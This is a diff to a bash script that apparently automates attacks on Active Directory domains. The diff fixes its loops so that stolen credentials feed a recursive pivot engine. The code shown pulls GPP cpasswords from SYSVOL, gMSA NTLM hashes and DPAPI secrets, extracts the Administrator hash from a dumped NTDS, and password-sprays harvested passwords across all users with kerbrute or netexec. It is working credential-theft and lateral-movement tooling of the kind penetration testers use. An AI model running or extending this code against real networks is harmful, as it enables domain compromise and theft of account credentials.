@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.3.0"
+readonly VERSION="1.3.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -902,19 +902,19 @@ phase_secrets() {
     subsection "GPP passwords (cpassword in SYSVOL — classic AD leak)"
     run "$NXC smb $DCT ${args[*]} -M gpp_password"
     $NXC smb "$DCT" "${args[@]}" -M gpp_password 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/gpp.txt"
-    grep -oiP 'password:\s*\K\S+' "$OUTDIR/gpp.txt" 2>/dev/null | while read -r p; do
+    while read -r p; do
         [[ -n "$p" ]] && { loot "GPP cpassword recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "GPP cpassword (SYSVOL)"; }
-    done
+    done < <(grep -oiP 'password:\s*\K\S+' "$OUTDIR/gpp.txt" 2>/dev/null)
 
     subsection "gMSA — group Managed Service Account hashes"
     run "$NXC ldap $DCT ${args[*]} --gmsa"
     local gmsa; gmsa=$($NXC ldap "$DCT" "${args[@]}" --gmsa 2>&1); echo "$gmsa" | tee -a "$LOGFILE"
     echo "$gmsa" | grep -iE 'Account:|NTLM:' >"$OUTDIR/gmsa.txt"
     # Queue any gMSA account whose NT hash we recovered
-    echo "$gmsa" | grep -oP "Account:\s*\K\S+(?=.*NTLM:\s*\S+)" 2>/dev/null | while read -r acc; do
+    while read -r acc; do
         local h; h=$(echo "$gmsa" | grep -i "$acc" | grep -oP 'NTLM:\s*\K[a-f0-9]{32}' | head -1)
         [[ -n "$h" ]] && { loot "★ gMSA hash recovered for $acc"; queue_cred "$acc" "" "$h"; }
-    done
+    done < <(echo "$gmsa" | grep -oP "Account:\s*\K\S+(?=.*NTLM:\s*\S+)" 2>/dev/null)
 }
 
 # ===========================================================================
@@ -1119,9 +1119,9 @@ phase_winrm_dpapi() {
             info "DPAPI needs local admin — not available with this account (expected if not privileged)"
         fi
         # Harvest any plaintext DPAPI recovered → feed the engine
-        echo "$d" | grep -oiP '(password|secret)\s*:\s*\K\S+' | sort -u | while read -r p; do
+        while read -r p; do
             [[ -n "$p" ]] && { loot "DPAPI secret recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "DPAPI"; }
-        done
+        done < <(echo "$d" | grep -oiP '(password|secret)\s*:\s*\K\S+' | sort -u)
         grep -qiE '\[CREDENTIAL\]|Saved' "$OUTDIR/dpapi.txt" 2>/dev/null && loot "DPAPI credential blobs decrypted → dpapi.txt"
     fi
 
@@ -1590,10 +1590,10 @@ phase_ntds_local() {
             local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
             echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
         done
-        grep -iE '^administrator:' "$OUTDIR/ntds_local.txt" | head -1 | while read -r l; do
+        while read -r l; do
             local h; h=$(echo "$l" | cut -d: -f4)
             loot "ADMINISTRATOR hash: $h"; queue_cred "Administrator" "" "$h"
-        done
+        done < <(grep -iE '^administrator:' "$OUTDIR/ntds_local.txt" | head -1)
         [[ "$DO_CRACK" == "1" ]] && {
             grep -E ':::' "$OUTDIR/ntds_local.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntds_ntlm.txt"
             crack_hashes "$OUTDIR/ntds_ntlm.txt" 1000 "NTLM"; }
@@ -1699,29 +1699,35 @@ _kerbrute_ok() { [[ -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BI
 # Spray a single password across all users and queue any valid hit.
 # Uses kerbrute when available; otherwise falls back to netexec (always present),
 # so a recovered/harvested password is ALWAYS sprayed → pivots even w/o kerbrute.
+#
+# NOTE: the result loops use `while … done < <(…)` (process substitution), NOT
+# `… | while`. A pipe runs the loop in a SUBSHELL, so queue_cred would mutate a
+# throwaway CRED_QUEUE and the new identities would never get pivoted. Keeping
+# the loop in the parent shell is what makes the recursive pivot actually work.
 _spray_one() {
-    local pw="$1" u
+    local pw="$1" u line
     if _kerbrute_ok; then
-        "$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
-            | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)' | while read -r u; do
-                loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
-                note_cred_source "${u}:${pw}" "password spray (kerbrute)"
-                queue_cred "$u" "$pw" ""
-            done
+        while read -r u; do
+            [[ -z "$u" ]] && continue
+            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
+            note_cred_source "${u}:${pw}" "password spray (kerbrute)"
+            queue_cred "$u" "$pw" ""
+        done < <("$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
+                   | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)')
     else
         # netexec fallback: spray this one password across every user over SMB.
         # Use Kerberos (-k) + FQDN when in Kerberos mode — many DCs disable NTLM
         # (STATUS_NOT_SUPPORTED), and Kerberos spray succeeds where NTLM can't.
         local kflag=(); [[ "$KERBEROS" == "1" ]] && kflag=(-k)
-        $NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
-            | tee -a "$LOGFILE" | grep -iE '\[\+\]' | while IFS= read -r line; do
-                u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
-                [[ -z "$u" ]] && continue
-                loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
-                note_cred_source "${u}:${pw}" "password spray (nxc)"
-                echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
-                queue_cred "$u" "$pw" ""
-            done
+        while IFS= read -r line; do
+            u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
+            [[ -z "$u" ]] && continue
+            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
+            note_cred_source "${u}:${pw}" "password spray (nxc)"
+            echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
+            queue_cred "$u" "$pw" ""
+        done < <($NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
+                   | tee -a "$LOGFILE" | grep -iE '\[\+\]')
     fi
 }
 
